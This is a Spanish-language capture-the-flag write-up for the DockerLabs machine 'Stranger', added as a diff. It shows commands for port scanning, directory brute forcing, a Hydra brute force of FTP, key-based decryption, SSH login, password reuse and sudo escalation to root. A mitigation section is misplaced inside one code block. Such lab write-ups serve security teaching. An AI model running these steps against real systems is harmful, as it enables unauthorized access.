@@ -1,0 +1,244 @@
+---
+title: Stranger
+description: Resolución completa de la máquina virtual *Stranger* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Stranger**, desarrollada por *kaikoperez* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone servicios FTP, SSH y HTTP. Mediante pistas en el contenido web, se identifica el usuario `admin` para FTP y se realiza fuerza bruta con Hydra para obtener acceso. En el servidor FTP, se descarga una clave privada RSA y un archivo cifrado, cuyo descifrado revela una contraseña para el usuario `mwheeler`, permitiendo acceso SSH.
+Una vez dentro, se prueba la reutilización de credenciales para acceder a `admin`. Finalmente, este usuario tiene privilegios sudo completos, permitiendo la escalada directa a `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Stranger',
+    Autor: 'kaikoperez',
+    Dificultad: 'Media',
+    Fecha: '27/07/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Stranger.zip
+sudo bash auto_deploy.sh Stranger.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Stranger/{content,exploits,nmap,scripts}
+cd Stranger
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **21/tcp** — FTP
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764806851/Ports_zoniol.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p21,22,80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1764806850/Gobuster_w001qy.png)
+
+**Rutas relevantes:**
+- `/index.html` — Página dirigida al usuario `mwheeler`.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1764806851/Index_dkbfrh.png)
+- `/strange` — Blog con pista sobre contraseña.
+  ![Strange](https://res.cloudinary.com/dewqswzke/image/upload/v1764806854/Strange_oxumgy.png)
+
+### 1.4 Enumeración en /strange
+
+```bash
+feroxbuster -u http://172.17.0.2/strange -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Gobuster2](https://res.cloudinary.com/dewqswzke/image/upload/v1764806851/Gobuster2_gl3uha.png)
+
+**Rutas encontradas:**
+- `/private.txt` — Archivo cifrado.
+- `/secret.html` — Indica usuario FTP (`admin`) y que la contraseña está en `rockyou.txt`.
+  ![Secret](https://res.cloudinary.com/dewqswzke/image/upload/v1764806851/secret_udgx7d.png)
+
+---
+
+### 1.5 Enumeración FTP
+
+El servicio FTP no permite acceso anónimo:
+
+```bash
+nmap -sCV -p21 172.17.0.2
+```---
+
+### Recomendaciones de Mitigación
+
+* Eliminar información sensible del contenido web público.
+* Utilizar contraseñas robustas y diferentes para cada servicio.
+* No reutilizar contraseñas entre cuentas de usuario.
+* Restringir drásticamente los permisos `sudo` y aplicar el principio de mínimo privilegio.
+
+---
+```
+
+![FTP](https://res.cloudinary.com/dewqswzke/image/upload/v1764806850/Ftp_injt98.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Fuerza bruta FTP
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://172.17.0.2
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1764806851/Hydra_kimmeo.png)
+
+### 2.2 Extracción de archivos
+
+```bash
+ftp 172.17.0.2
+get private_key.pem
+get private.txt
+```
+
+![Private key](https://res.cloudinary.com/dewqswzke/image/upload/v1764806851/Private_key_mfkowe.png)
+
+### 2.3 Descifrado del archivo
+
+```bash
+openssl rsautl -decrypt -inkey private_key.pem -in private.txt -out plaintext.txt
+```
+
+El archivo descifrado contiene la contraseña para `mwheeler`.
+
+### 2.4 Acceso SSH
+
+```bash
+ssh mwheeler@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1764806853/Ssh_xcsr8h.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De mwheeler → admin
+
+Se prueba la reutilización de la contraseña FTP para el usuario local `admin`:
+
+```bash
+su admin
+```
+
+![Admin](https://res.cloudinary.com/dewqswzke/image/upload/v1764806851/Admin_advep9.png)
+
+### 3.2 De admin → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1764806854/Sudo-lAdmin_dbf5i8.png)
+
+El usuario tiene privilegios sudo completos:
+
+```bash
+sudo su
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764737133/Root_hpk6oj.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Pistas sensibles en contenido web público",
+      severity: "Media",
+      impact: "Revelación de usuarios y método de ataque"
+    },
+    {
+      vulnerability: "Contraseña débil en FTP",
+      severity: "Crítica",
+      impact: "Acceso a archivos sensibles mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Reutilización de contraseñas entre servicios",
+      severity: "Crítica",
+      impact: "Movimiento lateral a usuario admin"
+    },
+    {
+      vulnerability: "Privilegios sudo completos en admin",
+      severity: "Crítica",
+      impact: "Escalada directa de privilegios a root"
+    }
+  ]}
+/>
